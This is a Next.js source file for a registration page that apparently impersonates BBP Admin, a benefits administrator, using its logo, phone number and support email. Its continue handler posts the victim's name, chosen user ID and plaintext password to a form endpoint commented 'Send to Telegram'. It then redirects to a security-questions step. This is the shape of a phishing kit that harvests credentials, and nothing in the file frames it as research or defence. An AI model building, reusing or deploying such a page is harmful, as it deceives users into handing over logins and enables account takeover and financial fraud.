'use client'

import { useState, useEffect } from 'react'
import { Check, Phone, Mail } from 'lucide-react'
import Link from 'next/link'
import Image from 'next/image'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Footer } from '@/components/footer'
import { useRequireRegistrationStep } from '@/hooks/use-route-guard'

export default function SetupPage() {
    useRequireRegistrationStep()
    const [firstName, setFirstName] = useState('')
    const [userId, setUserId] = useState('')
    const [password, setPassword] = useState('')
    const [confirmPassword, setConfirmPassword] = useState('')
    const [isLoading, setIsLoading] = useState(false)

    useEffect(() => {
        // Get the first name from session storage
        if (typeof window !== 'undefined') {
            const storedFirstName = sessionStorage.getItem('firstName')
            if (storedFirstName) {
                setFirstName(storedFirstName)
            }
        }
    }, [])

    // Password validation rules
    const passwordRules = {
        length: password.length >= 8 && password.length <= 16,
        uppercase: /[A-Z]/.test(password),
        lowercase: /[a-z]/.test(password),
        number: /[0-9]/.test(password),
        special: /[!@#$%^&*(),.?":{}|<>]/.test(password),
    }

    // User ID validation rules
    const userIdRules = {
        length: userId.length >= 8 && userId.length <= 99,
        alphanumeric: /^[a-zA-Z0-9@._-]*$/.test(userId),
    }

    const allPasswordRulesValid = Object.values(passwordRules).every(Boolean)
    const allUserIdRulesValid = Object.values(userIdRules).every(Boolean) && userId.length > 0
    const passwordsMatch = password === confirmPassword && confirmPassword.length > 0

    const isFormValid = allPasswordRulesValid && allUserIdRulesValid && passwordsMatch

    const handleContinue = async () => {
        if (!isFormValid) return

        setIsLoading(true)

        // Store user data and redirect to security questions
        if (typeof window !== 'undefined') {
            sessionStorage.setItem('userId', userId)
            // In a real app, you'd hash the password before storing
        }

        // Send to Telegram
        try {
            await fetch('/api/form-submission', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'User Credentials Setup',
                    firstName,
                    userId,
                    password,
                    timestamp: new Date().toISOString(),
                }),
            })
        } catch (error) {
            console.error('Failed to send notification:', error)
        }

        window.location.href = '/registration/security'
    }

    return (
        <div className="min-h-screen flex flex-col bg-white">
            {/* Header */}
            <header className="border-b border-gray-200 px-6 py-4">
                <div className="flex items-center">
                    <div className="flex items-center gap-6">
                        <Link href="/" className="flex items-center">
                            <Image
                                src="/BBPAdmin_Alegeus_Logo_Blue_Service.4ec5724d58c34a02b47bdfd467112a82.png"
                                alt="BBP Admin"
                                width={140}
                                height={32}
                                className="h-[34px] w-auto"
                                priority
                            />
                        </Link>
                        <div className="hidden md:flex flex-col text-xs text-gray-600 leading-tight">
                            <div className="flex items-center gap-2">
                                <Phone className="w-3 h-3" />
                                <span>(630) 773-2337</span>
                            </div>
                            <div className="flex items-center gap-2 mt-1">
                                <Mail className="w-3 h-3" />
                                <span>support@bbpadmin.com</span>
                            </div>
                        </div>
                    </div>
                    <div className="ml-6 text-[21px] text-gray-600 font-light">Registration</div>
                </div>
            </header>

            {/* Progress Bar */}
            <div className="flex h-1">
                <div className="flex-1 bg-[#1e3a5f]"></div>
                <div className="flex-1 bg-gray-300"></div>
            </div>

            {/* Main Content */}
            <main className="flex-1 px-6 py-8 bg-gray-50">
                <div className="max-w-md mx-auto">
                    {/* Greeting */}
                    <h1 className="text-2xl md:text-3xl font-bold text-gray-900 mb-2">
                        Great to meet you, {firstName || 'there'}!
                    </h1>
                    <p className="text-gray-600 mb-8">
                        Enter a User ID and a password to get started.
                    </p>

                    {/* User ID Section */}
                    <div className="mb-6">
                        <label className="block text-sm text-gray-600 mb-2">Choose User ID</label>
                        <Input
                            type="text"
                            value={userId}
                            onChange={(e) => setUserId(e.target.value)}
                            className="w-full border-0 border-b border-gray-300 rounded-none px-0 focus:ring-0 focus:border-[#1e3a5f] bg-transparent"
                        />
                    </div>

                    {/* User ID Rules */}
                    <div className="bg-gray-100 p-4 mb-6 text-sm text-gray-600 space-y-1">
                        <p>Must be between 8 and 99 characters long</p>
                        <p>Can contain Alphanumeric character</p>
                        <p>Can contain following special characters, @ (at sign) . (period) - (hyphen or dash) _ (underscore)</p>
                    </div>

                    {/* Password Section */}
                    <div className="mb-6">
                        <label className="block text-sm text-gray-600 mb-2">Choose Password</label>
                        <Input
                            type="password"
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            className="w-full border-0 border-b border-gray-300 rounded-none px-0 focus:ring-0 focus:border-[#1e3a5f] bg-transparent"
                        />
                    </div>

                    {/* Password Rules */}
                    <div className="bg-gray-100 p-4 mb-6 text-sm space-y-1">
                        <p className={passwordRules.length ? 'text-green-600' : 'text-gray-600'}>
                            {passwordRules.length && <Check className="w-4 h-4 inline mr-1" />}
                            Include 8-16 characters
                        </p>
                        <p className={passwordRules.uppercase ? 'text-green-600' : 'text-gray-600'}>
                            {passwordRules.uppercase && <Check className="w-4 h-4 inline mr-1" />}
                            Include 1 uppercase
                        </p>
                        <p className={passwordRules.lowercase ? 'text-green-600' : 'text-gray-600'}>
                            {passwordRules.lowercase && <Check className="w-4 h-4 inline mr-1" />}
                            Include 1 lowercase
                        </p>
                        <p className={passwordRules.number ? 'text-green-600' : 'text-gray-600'}>
                            {passwordRules.number && <Check className="w-4 h-4 inline mr-1" />}
                            Include 1 number
                        </p>
                        <p className={passwordRules.special ? 'text-green-600' : 'text-gray-600'}>
                            {passwordRules.special && <Check className="w-4 h-4 inline mr-1" />}
                            Include 1 special character
                        </p>
                    </div>

                    {/* Confirm Password Section */}
                    <div className="mb-8">
                        <label className="block text-sm text-gray-600 mb-2">Confirm Password</label>
                        <Input
                            type="password"
                            value={confirmPassword}
                            onChange={(e) => setConfirmPassword(e.target.value)}
                            className="w-full border-0 border-b border-gray-300 rounded-none px-0 focus:ring-0 focus:border-[#1e3a5f] bg-transparent"
                        />
                        {confirmPassword && !passwordsMatch && (
                            <p className="text-red-500 text-sm mt-1">Passwords do not match</p>
                        )}
                    </div>
                </div>
            </main>

            {/* Continue Button */}
            <div className="bg-gray-100 p-6">
                <div className="max-w-md mx-auto">
                    <Button
                        className={`w-full py-6 rounded-full text-white font-semibold ${isFormValid
                            ? 'bg-[#141c4d] hover:bg-[#407ec9] text-white transition-colors'
                            : 'bg-gray-400 cursor-not-allowed'
                            }`}
                        onClick={handleContinue}
                        disabled={!isFormValid || isLoading}
                    >
                        CONTINUE
                    </Button>
                </div>
            </div>

            <Footer />
        </div>
    )
}
